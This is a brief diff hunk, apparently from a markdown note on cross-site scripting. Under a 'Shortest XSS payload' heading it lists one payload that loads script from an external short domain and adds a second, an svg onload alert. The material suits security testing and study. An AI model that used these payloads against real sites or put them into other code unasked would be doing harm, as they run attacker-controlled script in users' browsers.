@@ -7,3 +7,4 @@ Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious s
 Shortest XSS payload:
 
 > <script/src=//⑭.₨>
+><svg/onload=alert()>
